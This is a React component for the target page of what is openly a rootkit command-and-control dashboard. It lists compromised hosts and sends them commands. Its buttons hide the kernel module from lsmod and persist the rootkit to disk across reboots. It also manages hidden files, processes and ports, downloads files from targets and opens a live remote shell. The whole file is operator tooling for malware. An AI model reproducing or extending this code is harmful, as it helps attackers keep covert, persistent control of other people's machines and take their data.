import { useState, useRef, useEffect, useCallback } from 'react'
import {
  ArrowLeft, RefreshCw, Shield,
  SquareTerminal, Eye, EyeOff, Loader, X,
  Clock, Radio,
} from 'lucide-react'
import { Badge } from '../components/Badge'
import { CmdBar } from '../components/CmdBar'
import { OverviewTab } from './tabs/OverviewTab'
import { FilesTab, DownloadOverlay, PreviewModal } from './tabs/FilesTab'
import { ProcsTab } from './tabs/ProcsTab'
import { PortsTab } from './tabs/PortsTab'
import { ShellTab } from './tabs/ShellTab'
import { LogTab, EventsTab } from './tabs/LogTab'

export { DownloadOverlay, PreviewModal }

/* -- Snapshot cache (shared across tabs) ---------------------- */

export const _cache = new Map()
export function useSnapshot(key) {
  const cached = _cache.get(key) || { data: null, time: null }
  const [data, setData] = useState(cached.data)
  const [time, setTime] = useState(cached.time)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState(null)
  const prevKey = useRef(key)
  if (prevKey.current !== key) {
    prevKey.current = key
    const fresh = _cache.get(key) || { data: null, time: null }
    setData(fresh.data)
    setTime(fresh.time)
    setLoading(false)
    setError(null)
  }
  const set = useCallback((d) => {
    const now = new Date()
    _cache.set(key, { data: d, time: now })
    setData(d)
    setTime(now)
    setError(null)
    setLoading(false)
  }, [key])
  const fail = useCallback((e) => { setError(e); setTime(new Date()); setLoading(false) }, [])
  return { data, time, loading, setLoading, error, set, fail }
}

/* -- Shared UI primitives ------------------------------------- */

function timeAgo(date) {
  const s = Math.floor((Date.now() - date.getTime()) / 1000)
  if (s < 5) return 'just now'
  if (s < 60) return `${s}s ago`
  if (s < 3600) return `${Math.floor(s / 60)}m ago`
  return date.toLocaleTimeString()
}

export function SnapshotBar({ title, icon: Icon, count, hiddenCount, time, loading, onSnapshot, online, children }) {
  const ago = time ? timeAgo(time) : null
  return (
    <div className="flex items-center gap-2 px-4 py-2 border-b-2 border-border bg-bg-2">
      {Icon && <Icon size={14} className="text-fg-3" />}
      <span className="text-sm font-bold uppercase tracking-wide">{title}</span>
      {count > 0 && <span className="nb-badge bg-main text-main-fg">{count}</span>}
      {hiddenCount > 0 && <span className="nb-badge bg-red text-white">{hiddenCount} hidden</span>}
      {children}
      <div className="ml-auto flex items-center gap-2">
        {ago && (
          <span className="text-[11px] text-fg-3 flex items-center gap-1 tabular-nums">
            <Clock size={10} /> {ago}
          </span>
        )}
        <button className="nb-btn p-1.5" onClick={onSnapshot} disabled={!online || loading} title="Refresh snapshot">
          <RefreshCw size={14} className={loading ? 'animate-spin' : ''} />
        </button>
      </div>
    </div>
  )
}

export function EmptySnapshotCta({ icon: Icon, title, subtitle, onCapture, online, loading }) {
  return (
    <div className="flex-1 flex items-center justify-center h-full">
      <div className="text-center px-6 py-10">
        <div className="mx-auto w-16 h-16 rounded-[var(--radius)] border-2 border-border bg-main/10 flex items-center justify-center mb-5 shadow-[3px_3px_0px_0px_var(--color-border)] nb-float">
          <Icon size={28} className="text-main" />
        </div>
        <div className="text-lg font-bold mb-1">{title}</div>
        <div className="text-sm text-fg-3 mb-6 max-w-xs">{subtitle}</div>
        <button className="nb-btn-main px-6 py-2.5 text-sm font-bold flex items-center gap-2 mx-auto" onClick={onCapture} disabled={!online || loading}>
          {loading ? <Loader size={16} className="animate-spin" /> : <Radio size={16} />}
          {loading ? 'Scanning...' : 'Capture Snapshot'}
        </button>
      </div>
    </div>
  )
}

export function HiddenSummary({ title, icon: Icon, items, onRemove, onAdd, placeholder }) {
  const [val, setVal] = useState('')
  const submit = () => { if (val.trim()) { onAdd(val.trim()); setVal('') } }

  return (
    <div className="border-b-2 border-border">
      <div className="flex items-center justify-between px-4 py-3 bg-bg-2">
        <div className="flex items-center gap-2">
          <Icon size={16} className="text-fg-3" />
          <span className="text-sm font-bold uppercase tracking-wider">{title}</span>
          <span className="nb-badge bg-main text-main-fg">{items.length}</span>
        </div>
        <div className="flex items-center gap-2">
          <input className="nb-input px-3 py-1.5 text-sm w-44" placeholder={placeholder}
            value={val} onChange={e => setVal(e.target.value)} onKeyDown={e => e.key === 'Enter' && submit()} />
          <button className="nb-btn px-3 py-1.5 text-sm" onClick={submit}>+ Add</button>
        </div>
      </div>
      {items.length ? items.map((v, i) => (
        <div key={i} className="flex items-center justify-between px-4 py-2.5 border-t-2 border-border hover:bg-bg-2 group">
          <div className="flex items-center gap-3">
            <span className="text-sm font-mono text-fg-3 w-6">{i}</span>
            <span className="font-mono text-sm">{v}</span>
          </div>
          <button className="text-sm font-bold text-red opacity-0 group-hover:opacity-100 hover:underline"
            onClick={() => onRemove(i)}>remove</button>
        </div>
      )) : (
        <div className="px-4 py-6 text-center text-fg-3 border-t-2 border-border">None</div>
      )}
    </div>
  )
}

/* -- Tabs ----------------------------------------------------- */

const TABS = [
  { key: 'overview', label: 'Overview' },
  { key: 'files', label: 'Files' },
  { key: 'procs', label: 'Processes' },
  { key: 'ports', label: 'Ports' },
  { key: 'shell', label: 'Shell', icon: SquareTerminal },
  { key: 'log', label: 'Command Log' },
  { key: 'events', label: 'Events' },
]

/* -- Main Target page ----------------------------------------- */

export function Target({ target: t, initialTab, log, events, sendCmd, query, execCmd, startDownload, downloads, onBack, renameTarget, refresh }) {
  const [tab, setTab] = useState(initialTab || 'overview')
  const [persistPending, setPersistPending] = useState(false)
  const [editing, setEditing] = useState(false)
  const [editVal, setEditVal] = useState('')
  const [shellStatus, setShellStatus] = useState('idle')
  const shellRef = useRef(null)

  useEffect(() => {
    setTab(initialTab || 'overview')
    setEditing(false)
  }, [t?.id])


  if (!t) return (
    <div className="flex items-center justify-center h-full">
      <p className="text-fg-3 font-bold text-lg">Target not found</p>
    </div>
  )

  const targetBusy = Object.values(downloads).some(dl => dl.targetId === t.id && dl.state === 'pending')
  const targetLog = log.filter(l => l.target === t.id)
  const hiddenFiles = t.hidden?.file || []
  const hiddenContent = t.hidden?.content || []
  const hiddenPids = t.hidden?.pid || []
  const hiddenPorts = t.hidden?.port || []
  const tabCounts = {
    overview: null, shell: null,
    files: hiddenFiles.length + hiddenContent.length,
    procs: hiddenPids.length || null,
    ports: hiddenPorts.length || null,
    log: targetLog.length,
    events: events.length,
  }

  const cmd = (command) => sendCmd(command, t.id)
  const toggleHide = () => cmd(t.module_hidden ? 'UNHIDE MODULE' : 'HIDE MODULE')
  const togglePersist = () => {
    setPersistPending(true)
    query(t.persisted ? 'UNPERSIST' : 'PERSIST', t.id).then(() => setPersistPending(false))
  }

  return (
    <div className="flex flex-col h-full">
      {/* Header */}
      <div className="flex items-center gap-3 px-5 py-2.5 border-b-2 border-border bg-secondary">
        <button className="nb-btn p-1.5 shrink-0" onClick={onBack}>
          <ArrowLeft size={16} />
        </button>
        <div className="min-w-0 mr-1">
          {editing ? (
            <form className="flex items-center gap-1" onSubmit={e => {
              e.preventDefault()
              const v = editVal.trim()
              if (v && v !== t.label) renameTarget?.(t.id, v)
              setEditing(false)
            }}>
              <input className="text-lg font-bold bg-bg border-b-2 border-main outline-none px-0 py-0 w-48"
                autoFocus value={editVal}
                onChange={e => setEditVal(e.target.value)}
                onBlur={() => setEditing(false)}
                onKeyDown={e => e.key === 'Escape' && setEditing(false)}
              />
            </form>
          ) : (
            <h1 className="text-lg font-bold truncate leading-tight cursor-pointer hover:text-main transition-colors"
              onClick={() => { setEditVal(t.label || t.hostname || t.id); setEditing(true) }}
              title="Click to rename"
            >{t.label || (t.hostname && t.hostname !== '(none)' ? t.hostname : t.id)}</h1>
          )}
          <div className="text-[10px] font-mono text-fg-3 truncate">{t.id} / {t.kernel} {t.arch} / {t.peer || '--'}</div>
        </div>
        <Badge label={t.online ? 'Online' : 'Offline'} color={t.online ? 'green' : 'red'} />

        <div className="ml-auto flex items-center gap-2 shrink-0">
          <button
            className={`nb-btn px-3 py-1.5 text-sm flex items-center gap-1.5 ${t.module_hidden ? 'nb-btn-main' : ''}`}
            onClick={toggleHide}
            disabled={!t.online || targetBusy}
            title={t.module_hidden ? 'Module hidden from lsmod' : 'Module visible in lsmod'}
          >
            {t.module_hidden ? <EyeOff size={14} /> : <Eye size={14} />}
            {t.module_hidden ? 'Hidden' : 'Visible'}
          </button>
          <button
            className={`nb-btn px-3 py-1.5 text-sm flex items-center gap-1.5 ${t.persisted ? 'nb-btn-main' : ''}`}
            onClick={togglePersist}
            disabled={!t.online || persistPending || targetBusy}
            title={t.persisted ? 'Rootkit persisted to disk, survives reboot' : 'Rootkit in memory only, lost on reboot'}
          >
            {persistPending ? <Loader size={14} className="animate-spin" /> : <Shield size={14} />}
            {t.persisted ? 'Persist On' : 'Persist Off'}
          </button>
        </div>
      </div>

      {/* Busy banner */}
      {targetBusy && (
        <div className="flex items-center gap-2 px-4 py-1.5 bg-amber/15 border-b-2 border-amber/30">
          <Loader size={12} className="animate-spin text-amber shrink-0" />
          <span className="text-xs font-bold text-amber">Download in progress. Commands are blocked until it completes.</span>
        </div>
      )}

      {/* Tabs */}
      <div className="flex border-b-2 border-border bg-secondary overflow-x-auto">
        {TABS.map(({ key, label, icon: TabIcon }) => (
          <button
            key={key}
            className={`px-4 py-2.5 text-sm font-bold whitespace-nowrap flex items-center gap-2 border-r border-border transition-colors shrink-0
              ${tab === key ? 'bg-main text-main-fg' : 'hover:bg-bg-2'}`}
            onClick={() => setTab(key)}
          >
            {TabIcon && <TabIcon size={14} />}
            {label}
            {key === 'shell' && shellStatus === 'connected' && (
              <span className="w-2 h-2 rounded-full bg-green pulse shrink-0" />
            )}
            {tabCounts[key] !== null && tabCounts[key] > 0 && (
              <span className={`text-xs px-1.5 py-0.5 font-mono rounded-[var(--radius)] border-2 border-border
                ${tab === key ? 'bg-secondary text-fg' : 'bg-bg-2'}`}>
                {tabCounts[key]}
              </span>
            )}
          </button>
        ))}
      </div>

      {/* Content */}
      <div className="flex-1 overflow-auto min-h-0 relative">
        {tab === 'overview' && <OverviewTab target={t} cmd={cmd} busy={targetBusy} />}
        {tab === 'files' && <FilesTab target={t} cmd={cmd} query={query} execCmd={execCmd} startDownload={startDownload} downloads={downloads} busy={targetBusy} />}
        {tab === 'procs' && <ProcsTab target={t} cmd={cmd} query={query} execCmd={execCmd} busy={targetBusy} />}
        {tab === 'ports' && <PortsTab target={t} cmd={cmd} execCmd={execCmd} busy={targetBusy} />}
        <div className={`flex flex-col h-full ${tab === 'shell' ? '' : 'hidden'}`}>
          <ShellTab ref={shellRef} target={t} onStatusChange={setShellStatus} visible={tab === 'shell'} />
        </div>
        {tab === 'log' && <LogTab entries={targetLog} />}
        {tab === 'events' && <EventsTab events={events} />}

        {/* Shell alive island */}
        {tab !== 'shell' && shellStatus === 'connected' && (
          <div className="absolute bottom-3 left-3 flex items-center gap-2 px-3 py-2 rounded-[var(--radius)] border-2 border-border bg-bg shadow-[3px_3px_0px_0px_var(--color-border)] cursor-pointer transition-transform hover:translate-y-[-1px] z-10"
            onClick={() => setTab('shell')}
          >
            <span className="w-2 h-2 rounded-full bg-green pulse shrink-0" />
            <SquareTerminal size={13} className="text-fg-2" />
            <span className="text-xs font-bold text-fg-2">Shell active</span>
            <button
              className="ml-1 p-0.5 rounded hover:bg-bg-2 text-fg-3 hover:text-fg transition-colors"
              onClick={e => { e.stopPropagation(); shellRef.current?.disconnect() }}
              title="Close shell session"
            >
              <X size={12} />
            </button>
          </div>
        )}
      </div>

      <CmdBar onSend={cmd} query={query} targetId={t.id} busy={targetBusy} />
    </div>
  )
}
